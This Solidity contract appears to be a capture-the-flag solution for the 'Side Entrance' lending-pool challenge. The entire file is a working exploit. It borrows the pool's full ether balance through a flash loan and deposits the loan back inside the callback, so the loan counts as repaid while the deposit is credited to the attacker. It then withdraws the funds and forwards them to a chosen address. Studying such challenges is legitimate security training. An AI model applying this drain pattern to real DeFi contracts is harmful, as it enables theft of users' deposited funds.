// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {console} from "hardhat/console.sol";
import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    address private pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        console.log("execute");
        SideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function attack(address _borrower) public {
        SideEntranceLenderPool(pool).flashLoan(pool.balance);
        SideEntranceLenderPool(pool).withdraw();
        (bool success, ) = payable(_borrower).call{
            value: address(this).balance
        }("");
        if (!success) {
            revert("Revert from borrower");
        }
    }

    receive() external payable {}

    fallback() external payable {}
}
